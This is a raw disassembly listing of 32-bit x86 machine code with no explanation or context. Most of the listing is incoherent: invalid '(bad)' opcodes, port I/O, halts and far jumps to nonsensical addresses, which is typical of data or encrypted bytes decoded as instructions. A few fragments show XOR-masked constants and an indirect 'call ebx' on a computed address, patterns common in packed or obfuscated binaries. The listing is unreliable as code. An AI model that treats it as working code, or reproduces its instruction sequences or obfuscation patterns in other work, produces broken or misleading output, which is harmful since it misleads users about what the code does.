  40dd37:	mov    esp,DWORD PTR [ecx]
  40dd39:	adc    dh,BYTE PTR [ebp+0x5]
  40dd3c:	dec    eax
  40dd3d:	jg     0x40dd8f
  40dd3f:	push   eax
  40dd40:	popf   
  40dd41:	xor    DWORD PTR [edx+0x9],ebp
  40dd44:	and    eax,0x277479f8
  40dd49:	in     eax,dx
  40dd4a:	call   DWORD PTR [ebp+0x51881d7]
  40dd50:	dec    esi
  40dd51:	jne    0x40dcf2
  40dd53:	lahf   
  40dd54:	ins    BYTE PTR es:[edi],dx
  40dd55:	loopne 0x40dd22
  40dd57:	pop    edi
  40dd58:	test   BYTE PTR [esi+0x67],cl
  40dd5b:	data16 test al,0xcd
  40dd5e:	mov    dh,0x6c
  40dd60:	or     edi,DWORD PTR [edi-0x51a22755]
  40dd66:	or     cl,BYTE PTR [ebp-0x10]
  40dd69:	sub    BYTE PTR [ecx-0x1b],0x95
  40dd6d:	ss adc eax,0x9d9cbbfb
  40dd73:	leave  
  40dd74:	stos   DWORD PTR es:[edi],eax
  40dd75:	jmp    0x40ddaa
  40dd77:	add    BYTE PTR [edi+eax*8+0x4d],dh
  40dd7b:	and    bl,bh
  40dd7d:	mov    dh,0x9d
  40dd7f:	std    
  40dd80:	or     eax,0x4ac7ea21
  40dd85:	adc    al,0xe5
  40dd87:	inc    edx
  40dd88:	cld    
  40dd89:	push   0xe38c4545
  40dd8e:	gs lock sbb al,0x4
  40dd92:	mov    esp,esp
  40dd94:	int    0x3b
  40dd96:	loop   0x40dd4f
  40dd98:	sbb    ch,dl
  40dd9a:	and    al,0xbd
  40dd9c:	adc    bh,dh
  40dd9e:	fistp  WORD PTR [ecx-0x23]
  40dda1:	mov    cs,edx
  40dda3:	shr    dl,cl
  40dda5:	idiv   al
  40dda7:	fisttp DWORD PTR [edx]
  40dda9:	inc    edx
  40ddaa:	xlat   BYTE PTR ds:[ebx]
  40ddab:	adc    eax,DWORD PTR [ebx+ebp*8]
  40ddae:	mov    dl,BYTE PTR [esi]
  40ddb0:	dec    edx
  40ddb1:	cmp    bl,bh
  40ddb3:	jae    0x40ddf1
  40ddb5:	(bad)  
  40ddb6:	out    0x3b,eax
  40ddb8:	jl     0x40ddb7
  40ddba:	leave  
  40ddbb:	popa   
  40ddbc:	sahf   
  40ddbd:	pop    esp
  40ddbe:	hlt    
  40ddbf:	sub    eax,DWORD PTR [ebx-0x2a6e9fc9]
  40ddc5:	mov    ds:0xce76d1ce,al
  40ddca:	(bad)  
  40ddcb:	leave  
  40ddcc:	ins    DWORD PTR es:[edi],dx
  40ddcd:	dec    esp
  40ddce:	and    BYTE PTR [ebx-0x59],dh
  40ddd1:	pushf  
  40ddd2:	mov    eax,0x746b77c0
  40ddd7:	jmp    0x541237d4
  40dddc:	inc    esp
  40dddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddde:	sub    esp,DWORD PTR [ebx]
  40dde0:	and    esi,ebp
  40dde2:	adc    al,0xaa
  40dde4:	aas    
  40dde5:	jmp    0x9d2e6239
  40ddea:	rcl    dl,0xdc
  40dded:	clc    
  40ddee:	sub    DWORD PTR [ecx+0x2b12f7a],esp
  40ddf4:	cmp    eax,DWORD PTR [eax-0xd256537]
  40ddfa:	(bad)  
  40ddfb:	repnz ins BYTE PTR es:[edi],dx
  40ddfd:	les    ecx,FWORD PTR [ecx+0xc]
  40de00:	jmp    0xe3f1:0x1bb3aa2e
  40de07:	iret   
  40de08:	dec    edi
  40de09:	xor    BYTE PTR [edx+ebx*2+0x2d],ah
  40de0d:	cmp    DWORD PTR [esp+edx*2],ecx
  40de10:	xchg   edx,eax
  40de11:	jbe    0x40de77
  40de13:	aaa    
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0x73e5f32c],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40deb1
  40de8e:	or     BYTE PTR [eax+0x1673da81],dl
  40de94:	addr16 mov dh,0x42
  40de97:	or     ch,bl
  40de99:	cli    
  40de9a:	fild   QWORD PTR [edi]
  40de9c:	adc    edi,edi
  40de9e:	iret   
  40de9f:	outs   dx,DWORD PTR ds:[esi]
  40dea0:	test   al,0x1d
  40dea2:	add    BYTE PTR [ebx],0x1d
  40dea5:	cmp    DWORD PTR [ecx+0x4c6c537a],esi
  40deab:	mov    cl,0xb
  40dead:	mov    ebx,0xeaac8273
  40deb2:	xchg   edi,eax
  40deb3:	inc    esp
  40deb4:	outs   dx,BYTE PTR ds:[esi]
  40deb5:	out    0x7,eax
  40deb7:	mov    dl,0x90
  40deb9:	inc    ebp
  40deba:	inc    ebx
  40debb:	sahf   
  40debc:	dec    esi
  40debd:	lahf   
  40debe:	jmp    0xdbc5:0x6e928e0f
  40dec5:	enter  0x63e4,0x39
  40dec9:	ins    BYTE PTR es:[edi],dx
  40deca:	scas   eax,DWORD PTR es:[edi]
  40decb:	ficomp DWORD PTR [edx-0x5960c1b4]
  40ded1:	jmp    0x40de65
  40ded3:	add    BYTE PTR [esi],al
  40ded5:	push   edi
  40ded6:	std    
  40ded7:	jmp    0x40de6c
  40ded9:	shr    BYTE PTR ds:0xf2faaa89,0x42
  40dee0:	das    
  40dee1:	sahf   
  40dee2:	jns    0x40ded3
  40dee4:	jnp    0x40def1
  40dee6:	cmovg  ecx,DWORD PTR [ebp+eiz*4+0x55]
  40deeb:	push   ds
  40deec:	mov    dh,0x9a
  40deee:	cs fmulp st(5),st
  40def1:	inc    ecx
  40def2:	test   DWORD PTR [eax],esi
  40def4:	jmp    0x40df10
  40def6:	or     al,0x31
  40def8:	sbb    esi,esp
  40defa:	lea    ebp,[ebx+0x52]
  40defd:	lods   eax,DWORD PTR ds:[esi]
  40defe:	push   edi
  40deff:	inc    esp
  40df00:	out    dx,eax
  40df01:	mov    ds:0x867f6fbc,eax
  40df06:	mov    ah,BYTE PTR [ebp-0x2653f2e7]
  40df0c:	fiadd  WORD PTR ds:0x8b2db6c3
  40df12:	adc    dl,BYTE PTR [eax-0x6d]
  40df15:	out    0xc1,al
  40df17:	dec    esp
  40df18:	jmp    0xa78f:0xfe22fc86
  40df1f:	jmp    0xb42b10c6
  40df24:	add    BYTE PTR [eax],dh
  40df26:	iret   
  40df27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df28:	push   ecx
  40df29:	into   
  40df2a:	leave  
  40df2b:	hlt    
  40df2c:	stos   DWORD PTR es:[edi],eax
  40df2d:	xchg   esi,eax
  40df2e:	fs clc 
  40df30:	cmp    bl,bl
  40df32:	adc    al,0xe9
  40df34:	(bad)  
  40df35:	mov    cl,0x2f
  40df37:	bound  esp,QWORD PTR [ebp-0x72894102]
  40df3d:	iret   
  40df3e:	sub    al,BYTE PTR [edi]
  40df40:	loopne 0x40dee7
  40df42:	retf   0x18b5
  40df45:	imul   esi,DWORD PTR [edi-0x34],0x62d9e08f
  40df4c:	jecxz  0x40df97
  40df4e:	mov    ecx,0x16e7156d
  40df53:	sti    
  40df54:	(bad)  
  40df55:	ror    DWORD PTR [ebx+eiz*2],1
  40df58:	(bad)  
  40df59:	or     edx,ebp
  40df5b:	aad    0xc2
  40df5d:	xor    al,bl
  40df5f:	fimul  DWORD PTR [ebx-0x6f]
  40df62:	cmp    al,BYTE PTR [ecx+edi*8+0x1a]
  40df66:	push   0xf5c01825
  40df6b:	mov    dh,0xa6
  40df6d:	shl    DWORD PTR [esi-0xc0615c1],1
  40df73:	pop    ss
  40df74:	call   0x9612:0x72a9dd3a
  40df7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df7c:	(bad)  
  40df7d:	in     al,0xc
  40df7f:	or     DWORD PTR [eax+0x155f263e],ebp
  40df85:	cmp    al,0x95
  40df87:	sbb    DWORD PTR [ebx+0x68],esp
  40df8a:	outs   dx,BYTE PTR ds:[esi]
  40df8b:	xchg   edi,eax
  40df8c:	lahf   
  40df8d:	or     DWORD PTR [ebx],ebx
  40df8f:	jns    0x40dff2
  40df91:	hlt    
  40df92:	xor    BYTE PTR [esi],al
  40df94:	mov    ebx,0x9084b428
  40df99:	outs   dx,DWORD PTR ds:[esi]
  40df9a:	mov    al,ds:0x3a995294
  40df9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa0:	(bad)  
  40dfa1:	mov    ah,0x9f
  40dfa3:	fs cwde 
  40dfa5:	fidivr DWORD PTR [eax-0x3a]
  40dfa8:	xchg   ebp,eax
  40dfa9:	adc    DWORD PTR es:[esi+0x2be42e19],0x8c9baa7a
  40dfb4:	fld    TBYTE PTR ds:0x4340de5b
  40dfba:	xchg   ebx,ecx
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
